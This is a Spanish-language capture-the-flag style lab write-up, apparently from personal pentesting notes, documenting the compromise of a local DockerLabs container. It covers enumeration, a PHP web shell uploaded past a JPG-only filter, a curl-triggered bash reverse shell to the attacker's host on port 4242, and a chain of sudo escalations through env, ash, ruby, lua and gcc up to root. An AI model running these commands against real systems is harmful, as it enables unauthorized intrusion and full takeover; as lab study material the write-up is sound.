## Fase de Reconocimiento y Descubrimiento (Enumeración)

### Escaneo de Puertos (Nmap)
Realizamos un escaneo de puertos inicial con nmap para identificar los servicios abiertos:

![[Pasted image 20260629001537.png]]

**Servicios identificados:**
* **Puerto 80/TCP (HTTP):** Servidor web expuesto (único puerto abierto). Ver teoría en [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]].

---

## Enumeración Web

### Inspección e Identificación de Directorios (WhatWeb / Gobuster)
Realizamos un reconocimiento de tecnologías mediante whatweb y fuzzing de directorios con gobuster:

![[Pasted image 20260629001700.png]]

* **Hallazgo:** Identificamos un directorio `/themes`. Tras realizar una búsqueda recursiva sobre esta ruta para encontrar recursos o páginas de interés:

![[Pasted image 20260629002013.png]]

* **Hallazgo Clave:** Detectamos un archivo PHP en el servidor que sugiere una funcionalidad de subida de archivos (upload).

---

## Fase de Explotación / Intrusión

### Subida de Archivos y Ejecución Remota de Comandos (RCE)
Debido a que no contamos con una interfaz gráfica web directa para la subida de archivos, procedemos a realizar la solicitud de subida a través de la terminal:

![[Pasted image 20260629002120.png]]

La validación del lado del servidor restringe la subida únicamente a extensiones de imagen JPG. Para evadir esta restricción y ejecutar código malicioso, subimos un script de PHP pero utilizando una doble extensión o renombrado (ej. archivo PHP con extensión final .jpg). Ver teoría sobre evasión de filtros de subida en [[Pentesting Notes/Web/Vulnerabilities/02-Path_Traversal/Cheat Sheet\|Path Traversal Cheat Sheet]].

![[Pasted image 20260629002211.png]]

El archivo se carga con éxito en la ruta `/themes/uploads/`. Procedemos a interactuar con él pasándole comandos en el parámetro configurado:

![[Pasted image 20260629002235.png]]

### Obtención de una Shell Inversa (Reverse Shell)
Confirmada la ejecución remota de comandos (RCE), nos ponemos en escucha en nuestra máquina atacante por el puerto 4242 y forzamos una conexión de retorno:

```bash
curl http://172.17.0.2/themes/uploads/6a419b3345965.jpg?cmd=/bin/bash%20-c%20%27/bin/bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/4242%200%3E%261%27
```

Obtenemos con éxito una shell interactiva como el usuario de bajos privilegios `www-data`.

---

## Escalada de Privilegios

La escalada de privilegios se compone de un encadenamiento de pivotajes entre diferentes usuarios locales (un "ascensor" de privilegios):

### 1. Pivotaje de `www-data` a `daphne` (env)
Enumeramos los privilegios de sudo para el usuario actual:

![[Pasted image 20260629003156.png]]

* **Vector:** El usuario `www-data` puede ejecutar el binario `/usr/bin/env` como el usuario `daphne` sin proporcionar contraseña. Ver teoría en [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Permissions.md]].
* **Explotación:**
  ```bash
  sudo -u daphne /usr/bin/env /bin/bash
  ```

### 2. Pivotaje de `daphne` a `vilma` (ash)
Enumeramos los permisos de sudo de `daphne`:

![[Pasted image 20260629003305.png]]

* **Vector:** El usuario `daphne` puede ejecutar la shell `ash` como `vilma` sin ingresar contraseña.
* **Explotación:**
  ```bash
  sudo -u vilma /usr/bin/ash
  ```

### 3. Pivotaje de `vilma` a `shaggy` (ruby)
Enumeramos los permisos de sudo de `vilma`:

![[Pasted image 20260629003522.png]]

* **Vector:** El usuario `vilma` puede ejecutar el intérprete `/usr/bin/ruby` como `shaggy` sin contraseña.
* **Explotación:**
  ```bash
  sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/bash"'
  ```

### 4. Pivotaje de `shaggy` a `fred` (lua)
Enumeramos los permisos de sudo de `shaggy`:

![[Pasted image 20260629003728.png]]

* **Vector:** El usuario `shaggy` puede ejecutar `/usr/bin/lua` como `fred` sin contraseña.
* **Explotación:**
  ```bash
  sudo -u fred /usr/bin/lua -e 'os.execute("/bin/bash")'
  ```

### 5. Pivotaje de `fred` a `scooby` (gcc)
Enumeramos los permisos de sudo de `fred`:

![[Pasted image 20260629004141.png]]

* **Vector:** El usuario `fred` puede ejecutar el compilador `/usr/bin/gcc` como `scooby` sin contraseña.
* **Explotación:**
  ```bash
  sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s x
  ```

### 6. Escalada Final a `root` (sudo)
Enumeramos los permisos de sudo de `scooby`:

![[Pasted image 20260629004257.png]]

* **Vector:** El usuario `scooby` puede ejecutar el binario `/usr/bin/sudo` como `root` sin contraseña.
* **Explotación:**
  ```bash
  sudo -u root /usr/bin/sudo /bin/bash
  ```

¡Obtenemos finalmente una shell de root en la máquina!

---

## Relaciones y Conceptos
* **Teoría:** [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Linux Privilege Escalation - Permissions.md]], [[Pentesting Notes/Web/Vulnerabilities/02-Path_Traversal/Cheat Sheet\|Path Traversal Cheat Sheet]], [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]]
* **Laboratorios Relacionados:** [[Laboratorios/DockerLabs/Facil/Duque\|Duque]] (Comparte escalada por env), [[Laboratorios/DockerLabs/MuyFacil/Vacaciones\|Vacaciones]] (Comparte pivotaje por ruby)
